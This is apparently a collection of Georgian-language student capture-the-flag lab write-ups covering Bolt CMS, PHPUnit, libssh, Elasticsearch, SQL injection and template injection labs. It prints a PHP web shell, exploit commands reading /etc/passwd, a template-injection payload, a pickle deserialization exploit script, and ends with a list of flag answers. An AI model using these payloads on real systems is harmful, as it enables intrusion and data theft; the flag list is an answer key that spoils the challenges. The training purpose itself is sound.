სიმულაციური აქტივობა 1
ლანა ეგიკოვა
Lab: Bolt
შევდივარ მითითებულ აიპი ადრესზე და მხვდება ასეთი გვერდი
ვნახულობ გვერდის სორსს, შემდეგ url-ში ვამატებ სიტყვა bolt-ს რადგან სორსში არის
მითითება href=bolt.cm და ამის შემდეგ იხსნება ასეთი გვერდი სარეგისტრაციო პანელით
შემდეგ ვვარაუდობთ შესაძლო იუზერს და პაროლს და რამდენიმე ცდის შედეგად იხსნება
გვერდი
ამის შემდეგ File management-ში გადავდივართ რო ვნახო შეგვიძლია თუ არა რაიმე php ფაილის
ატცვირთვა, ამისთვის ვქმნით ფაილს test.php , მაგრამ გვერდი ვერ აღიქვამს ამ ფაილს,
ექსთენშენის გადარქმევის შედეგად php->html ატვირთვა შესაძლებელი გახდა
შემდეგ უკვე ატვირთულ html ფაილს ვუცვლით php-ზე და ვაკლიკებთ მასზე, თუმცა გვერდი
მაინც ცარიელია ამიტომ ვცდი ასეთი ბრძაწნების მიწერას
შემდეგ ამის და აი ჩვენი ფლეგიც
Lab: Php-unit
შევდივარ მითითებულ მისამართზე და მხვდება რაღაც გვერდი სურათით
ამ ლაბში დაგვჭირდება dirsearch თული, ეს არის “advanced” command line რომელიც გვეხმარება
ფაილების და ფოლდერების დაბრუტფორსებაში ვებსერვერებზე
გადმოვწერეთ და ტერმინალში ვწერთ ასეთ ბრძანებას
ახლა გვჭირდება გავიგოთ თუ php-unit-ის რომელი ვერსიაა, ამაში დაგვეხმარება composer.json
გავიგეთ ვერსია და ახლა გუგლში ვეძებთ ვულნერაბილითის, მონიშნულ ნაწილს ვუწერთ
მისამართს
ახლა დაგვჭირდება burpsuite, მისი მეშვეობით ხელახლა შევდივართ ამ მისამართზე
შემდეგ ვაგზავნით repeater-ში და ვუწერთ ასეთ ბრძანებას
ვაჭერთ გაგზავნას და აი ჩვენი ფლეგიც
Lab: Libshh
შევდივარ მითითებულ აიპი ადრესზე და მხვდება ასეთი გვერდი, libssh არის
მულტიპლატფორმული C ლაიბრერი, რომელიც ახორციელებს SSHv2 პროტოკოლს კლიენტსა
და სერვერის მხრიდან. ამ ლაიბრერით შეგვიძლია ჩავრთოთ პროგრამები, გადავაგზავნოთ
ფაილები და ასე შემდეგ.
Nmap-ის საშუალებით ვასკანირებ პორტს ტერმინალში
ამის შემდეგ github-ზე ვეძებ libshh.py რადგან ფლეგის მოძებნაში ეგ დაგვეხმარება
და ვწერ ასეთ ბრძანებას რომელმაც უნდა მიმიყვანოს ფლეგამდე
თეორიული ნაწილი
2) Fuzzing არის ხარისხის უზრუნველყოფის (QA) ტექნიკა, რომელიც გამოიყენება
კოდირების შეცდომებისა და უსაფრთხოების ხარვეზების გამოსავლენად
პროგრამულ უზრუნველყოფაში, ოპერაციულ სისტემებში ან ქსელებში. ის
მუშაობს სისტემის დაქრაშვის მეთოდით ან რაიმე შეცდომების გამომწვევით,
როცა ხდება რანდომი ინპუტების შეყვანა. თუ აღმოჩენილია vulnerability, fuzz
ტესტირების პლატფორმა (ასევე უწოდებენ fuzzer) დაგვეხმარება მიზეზის
დადგენაში.
Website enumeration გულისხმობს რესურსების აღმოჩენას, რომლებსაც იყენებს ვებ
სერვერი, ისევე როგორც მთავარ, ძირითად ტექნოლოგიას, რომელზეც მუშაობს
ვებ სერვერი. ეს ინფორმაცია დაგვეხმარება ავარჩიოთ უფრო ეფექტური
თავდასხმის გზები, ისევე როგორც ასევე გამოიყენოს დაუცველობა ვებ სერვერის
პროგრამული უზრუნველყოფის კონკრეტულ ვერსიებში.
ჩვენ გვაქვს ასეთი თულები- Nmap, Metasploit, dirbuster და ა.შ. რაც გვეხმარება
Website enumeration-ისთვის
1)CVE-2018-10993 არის Libssh აუტენტიფიკაციის ექსპლოიტი, ხოლო libshh არის ლაიბერი.
კონკრეტულად ეს ფექიჯი როგორც უწერიათ საიტზე, არის
მულტიპლატფორმული C ლაიბერი რომელიც ახორციელებს SSHv2 პროტოკოლს
როგორც კლიენტ ასევე სერვერ საიდზე. ამ ლაიბერით შეგვიძლია ჩავრთოთ
პროგრამები, გადავაგზავნოთ ფაილები, დავამენეჯოთ ფაბლლიქ ქიები და ა.შ.
Lab: elastic
მითითებულ IP მისამართზე შესვლისას, ეკრანზე მოცემული შედეგით საკმაოდ დიდი
ინფრომაციის მიღება შეიძლება.
ვიღებთ ინფორმაციას ვერსიის შესახებ. ამ შემთხვევაში ვხედავთ რომ გამოყენებულია 1.3.4
ვერსია. ამიტომ ვეძებ ცნობილ სისუსტეებს elastic ვერსია 1.3.4 ზე. ინტერნეტში ძებნის
შედეგად გადავაწყდით Arbitrary file read CVE. ამაზე exploit შეგვიძლია ვიპოვოთ CVE-2015-
5531- Arbitrary file Vulnerability. ამ exploit-ის გამოყენებისთვის უნდა გავუშვათ შემდეგი
ბრძანება: python3 exploit_elastic.py IPIPIP /etc/passwd დაბრუნებულ შედეგში ჩანს ჩვენი CTF.
Lab: nodiff-backdoor
IP მისამართზე შესვლისას, პირველ რიგში უნდა გამოვიკვლიოთ მაქსიმალურად მეტი რამ ამ
საიტის შესახებ. კვლევის ერთ-ერთ მეთოდს წარმოადგენს Dirsearch. მისი გამოყენების
შედეგად რამდენიმე ქვესაქაღალდე იქცევს ყურადღებას, ერთ-ერთია backup.zip. როდესაც ამ
მისამართს მივმართავთ გადმოიწერს დაარქივებულ ფაილს. ფაილის ამორაქივების შემდეგ
ვხედავთ რომ ის იყენებს PHP-ს. ამიტომ ვეძებთ არსებულ სისუსტეებს, რაც შეიძლება რომ
გამოვიყენოთ. კოდში, backdoor-ის სახით, შეიძლება დატოვებული იყოს ისეთი კოდის
ფრაგმენტი, რომელიც გაშვებადია. ერთ-ერთ გაშვებად კოდს წარმოადგენს shell_exec. კოდში
grep –r “shell_exec(“ ბრძანებით ვნახულობთ რომ ასეთი ფრაგმენტი არსებობს. ამ ფრაგმენტის
გაანალიზებით ვხვდებით რომ როდესაც გავაგზავნით GET request-ს სადაც
welldone=knockknock გაეშვება ის რასაც ასევე ჩვენ გადავცემთ shazam პარამეტრის სახით.
DirSearch ის დროს ასევე შევამჩნიეთ flag.php ამიტომ მოდი ვცადოთ მისი წაკითხვა.
/?welldone=knockknock&shazam=cat flag.php ერთი შეხედვით არაფერი მოხდა თუმცა request
წარმატებული იყო. თუ ჩვენ მაინც შევამოწმებთ inspect elements ჩვენ დავინახავთ ჩვენს flag-ს.
სიმულაციური აქტივობა 1
გიორგი მაკასარაშვილი
Lab: PHP-Unit
მოცემულ IP მისამართზე შესვლისას ვხედავთ შემდეგ სურათს.
ახლა ვცდილობთ რაც შიძლება მეტი ინფორმაცია მივიღოთ ამ გვერდის შესახებ. საკმაოდ დიდ
ინფორმაციას მივიღებთ თუ გამოვიყენებთ dirsearch-ს, რომელიც დაგვეხმარება ფოლდერებისა
და ფაილდების bruteforce-ში. იმისთვის რომ ეს გამოვიყენოთ უნდა დავაყენოთ dirsearch და
გავუშვათ შემდეგი ბრძანება ./dirsearch.py -u http://34.89.210.219:30835/ -w ./db/dicc.txt
თვალში გვხვდება composer.json, მოდი ვნახოთ რა არის მანდ.
ჰოი საოცრებავ, ვიგებთ PHP-ს ვერსიას. ახლა შეგვიძლია ინტერნეტში მოვძებნოთ თუ არის ამ
ვერსიაზე უკვე რაიმე ცნობილი სისუსტე.
ყოფილა, PHPUnit Remote Code Execution (CVE-2017-9841), გადაკითხვის შედეგად ვიგებთ რომ
თურმე შეგვიძლია ჩვენთვის სასურველი php კოდის გაშვება, აბა ვცადოთ....
ამისთვის /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php უნდა დავამატოთ url-ს და გავუშვათ
post request. ამაში burpsuite დაგვეხმარება.
Burpsuite-ში ჩავრთავთ proxy-ს და მივუთითებს შესაბამის მისამართს, ამის შემდეგ გადაგვაქ
repeater-ში და დავატებთ ჩვენთვის სასურველ php კოდს
ვუალაა!!! ფლეგი ნაპოვნია.
Lab: elastic
მოცემულ IP მისამართზე შესვლისას ვხედავთ შემდეგ სურათს.
უკვე საკმაოდ დიდ ინფორმაციას ვიღებთ. ყველაზე მნიშვნელოვანი არის ვერსია 1.3.4
ინტერნეტში მოვძებნოთ თუ არის რაიმე ცნობილი სისუსტე elastic 1.3.4-ზე. მრავალი ძებნის
შემდეგ წავაწყდით exploit-ს: https://github.com/nixawk/labs/tree/master/CVE-2015-5531
ამ exploit-ის გამოყენებისთვის უნდა გავუშვათ შემდეგი ბრძანება:
python3 exploit.py http://34.89.210.219:31944/ /etc/passwd
დაბრუნებულ შედეგში ჩანს ჩვენი CTF.
სიმულაციური 2: გიორგი მაკასარაშვილი
ლაბი:
მოცემულ აიპი მისამართზე შესვლისას ვხედავთ შემდეგ სურათს
პირველ რიგში უნდა მოვიძიოთ რაც შეიძლება მეტი ინფორმაცია. ამის ერთ-ერთი
საშუალებაა dirseach. მისი გამოყენების შედეგად თვალში გვხვდება რამდენიმე დეტალი.
ერთ-ერთია რეგისტრაციის გვერდი.
ამ გვერდზე გადასვლისას ვხედავთ შემდეგ სურათს
ვცადოთ რეგისტრაცია სახელი:admin პაროლი:Giorgi
ამის შემდეგ ვცადოთ login
input ველში ვცადოთ სხვადასხვა მნიშვნელობების ჩაწერა. მაგალითისთვის როგორც ჩანს
%ის ჩაწერის დროს ყველანაირ პროდუქტს გვაჩვენებს, რაც იმას ნიშნავს რომ საიტი
მოწყვლადია SQLi injection-ის მიმართ.
ახლა შევამოწმოთ cookie, რადგან ვნახოთ დალოგინებისას რაიმე თუ შეინახა იქ. რაღაც გვაქ
ახლა ის უნდა გამოვიყენოთ sql injection-ში, რომლესაც sqlmap-ის საშუალებით ვიზავთ.
sqlmap --cookie="PHPSESSID=742e03f3a4f089e568eb2f9857c7c9ad" -u
http://34.107.71.117:32625/index.php --forms --columns --random-agent ბრძანების გაშვების
შემდეგ ვიღებთ შედეგს სადაც ცხრილის სახელად ვხედავთ ctf-ის ნაწილს
CTF{1nformat1on_sch3ma_c4n_ , ხოლო მეორე ნაწილი იმავე ცხრილში სვეტში ერთ-ერთი
მნიშვნელობაა: _d4t4}
CTF{1nformat1on_sch3ma_c4n_d4t4}
ლაბი: shark
მოცემულ მისამართზე შესვლისას ვხედავთ მხოლოდ ერთ input ველს
ამ ველში ნებისმიერი რამის ჩაწერის დროს, იგივე რამ გვიბრუნდება უკან
ცოტა უფრო მეტი ინფორმაცია რომ მოვიძიოთ მის შესახებ მაგალითად სერვერის, უნდა
გამოვიყენოთ curl
ვხედავთ რომ ეს არის Werkzeug. ინტერნეტ სივცეში მრავალი ძებნის შემდეგ მივაკვლევთ
შესაბამის ბრძანებას, რისი გაშვების შემდეგაც ვიპოვით ctf-ს <%
x=open("flag","r")
%>
${x.readlines()}

სიმულაციური აქტივობა
გიორგი მაკასარაშვილი
LAB: shark
მოცემულ მისამართზე შესვლისას ვხედავთ მხოლოდ ერთ input ველს
ამ ველში ნებისმიერი რამის ჩაწერის დროს, იგივე რამ გვიბრუნდება უკან
ცოტა უფრო მეტი ინფორმაცია რომ მოვიძიოთ მის შესახებ მაგალითად სერვერის,
უნდა გამოვიყენოთ curl
ვხედავთ რომ ეს არის Werkzeug. ინტერნეტ სივცეში მრავალი ძებნის შემდეგ
მივაკვლევთ შესაბამის ბრძანებას, რისი გაშვების შემდეგაც ვიპოვით ctf-ს
<%
x=open("flag","r")
%>
${x.readlines()}
LAB: online encryption
მოცემულია wireshark ფაილი, ამ ფაილში უნდა მოვძებნოთ ინფორმაცია შესაბამისი ფილტრების
გამოყენებით, პირველ რიგში უნდა გავფილტროთ http. ამის შემდეგ დავაკვირდებით რომ საინტერესო
ინფორმაცია არის გაგზავნილი მისამართზე 23.101.63.214, ამიტომ ვადებთ 2 ფილტრს. მიმღები რომ
იყოს აღნიშნული მისამართი და გამოყენებული იყოს http.
შედეგად ვხედავთ რამდენიმე გაგზავნილ პაკეთს, ყურადღებას იქცევს post მეთოდი რადგან ის
დაშიფრულია MD5-ით. მცირე ძებნისას ვაწყდებით დაშიფრულ სტრიქონს.
ინტერნეტში ძებნისას შეგვიძლია მივაკვლიოთ მისი გაშიფრის ხერხს.
შუალედური: გიორგი მაკასარაშვილი
LAB: elastic
მოცემულ IP მისამართზე შესვლისას ვხედავ მოცემულ შედეგს
უკვე ერთი შეხედვით საკმაოდ დიდ ინფორმაციას ვიღებთ. ერთ-ერთი ყველაზე მნიშვნელოვანია
ვერსია. როგორც ვხედავთ ვერსიის ნომერია 1.3.4 ამიტომ ვცდილობთ მივიღოთ ინფორმაცია
ელასტიკის 1.3.4 ვერსიის შესახებ.
Elastic 1.3.4 -ის გუგლში მოძებნის შედეგად ვიღებთ ქვემოთ მოცემულ სურათს რაც ნამდვილად არ
გვჭირდება
ამიტომ ვცდილობთ მოვძებნოთ აღნიშნული ვერსიის სისუსტეები. მცირე ძებნის შემდეგ
გადავაწყდებით CVE-2015-5531 -ს რაზეც უკვე არსებობს exploit
ამ კოდის გაანალიზების შემდეგ ვხვდებით რომ მის გამოსაყენებლად საჭიროა შემდეგი ბრძანების
გამოყენება: python3 exploit.py http://34.159.104.59:31363/ /etc/passwd
და აი ჩვენი CTF-იც
LAB: BOLT
მოცემულ მისამართზე შესვლისას გვხვდება ქვემოთ მოცემული შედეგი
არსებული საიტის სორს კოდის ანალიზის შედეგად ვხვდებით რომ URL-ში უნდა მივმართოთ
http://34.159.104.59:30660/bolt-ს რის შედეგადაც ვხვდებით ავტორიზაციის გვერდზე
უნდა ვეცადოთ შევიდეთ ადმინის უფლებებუით, რამდენიმე მარტივი ცდის შემდეგ ჩვენ შეგვიცლია
გამოვიცნოთ მომხმარებლის სახელი და პაროლი რადგან არც თუ ისე ძლიერი პაროლი და default
მომხმარებლის სახელი არის გამოყენებული.
შესვლისას და აღნიშნული dashboard-ის დათვალიერებისას ვხედავთ რომ შეგვიძლია ფაილების
ატვირთვა, თუმცა არა ყველა ფორმატის, ასევე შეგვიძლია ფაილის ფორნმატის შეცვლა. უნდა ვცადოთ
სასურველი ფაილის ფორმატის ატვირთვა და შემდეგ ამ ფაილის ტიპის შეცვლა. ავტვირთოთ TXT ტიპის
ფაილი, რომკელშიც იქნება PHP-ის კოდი ჩაწერილი, მაგალითისთვის: <?php system($_GET['cmd']) ?>
რომელიც ქომანდ ლაინზე მოგვცემს წვდომასა და ბრძანებების გაშვების შესაძლებლობას.
ატვირთვის შემდეგ უნდა შევუცვალოთ ფაილს გაფართოება და გავხადოთ PHP. ფაილის გახსნის შემდეგ
გადავდივართ ახალ გვერდზე. მოდი ვცადოთ რაიმე ქომანდის გაშვება URL-ის საშუალებით.
შედეგი გვაქვს და აქვრ ვხედავთ ფაილს სახელად flag.txt. უნდა წავიკითხოთ ეს ფაილი შესაბამისი
ბრძანებით: cat /flag.txt
ჩვენი ფლეგიც.
LAB: PHP unit
მისამართზე შესვლისას ვხედავთ შემდეგ სურათს
პირველ რიგში ვცდილობთ მაქსიმალურრად მეტი ინფორმაცია მივიღოთ ამ საითის შესახებ. ერთ-ერთი
გზა არის dirsearch
მისი გამოყენების შემდეგ თვალში საინტერესოდ ხვდწება რამდენიმე ქვედირექტორია ერთ-რთი არის
composer.json. შესაბამის მისამართზე შესვლისას ვხედავთ ვერსიის ნომერს.
ახლა საჭიროა ამ ვერსიის PHP-ზე ვნახოთ შესაბამისი სისუსტეები.
როგორც ჩანს მოცემულ მისამართზე შესვლისას ჩვენ გვაქ შესაძლებლობა გავუშვათ ბრძანებები. მოდი
ვცადოთ burpsuite-ს გამოყენებით. პირველ რიგში გავუშვათ ls -l / რათა ვნახოთ თუ რა არის
განთავსებული იქ
აქვე ვხედავთ ფაილს სახელად flag.txt მოდი ვნახოთ რა არის მანდ.
ჩვენი ფლეგი.
import pickle
import base64
import requests
class Exploit(object):
def __reduce__(self):
return eval, ("open('flag','r').read()",)
def sendPayload(p):
print(base64.urlsafe_b64encode(p))
headers = {"Cookie": "data=" + base64.urlsafe_b64encode(p).decode()}
t = requests.get("http://34.107.71.117:32664/dashboard",headers=headers)
print(t.text)
sendPayload(pickle.dumps(Exploit(), protocol=2))







php - CTF{8c7795c5332da1491741a61fe780006a619273444bfe54aff555e28f83e3b123}

bolt - CTF{b12e3b34c581d4f3c66c00cc7f8dabec8838dab0acf26c2cfbe2f7d291326f75}

shark - CTF{4b08602e0090f81707b98ca687a5cacfd32888ffceef1d3cff2d99e6034b1e58}

sweet-and-sour - CTF{ccc1ccef217ed19c492bdada049ad2b0fbf1adcb72a92f13ab153aae068f797f}

nodiff - CTF{87702788126237df9c4a915fea9441345dc6b3a0272b214b2c31e50a8f89c4b1}

schematics - CTF{1nformat1on_sch3ma_c4n_d4t4}

elastik - CTF{265b92ed0091f139fdcd438196426f205fed9b14bce765bafd8344b1d96183e5}

Authorization - CTF{5b7cc033a48df4958a076286420b4a91631defa16be26409afbdf1e053367b21}

online encryption - ECSC{dd545fbf12fd608daa8c201f50f95c8520bec9f744a3573b1dc0bc53ce019726}
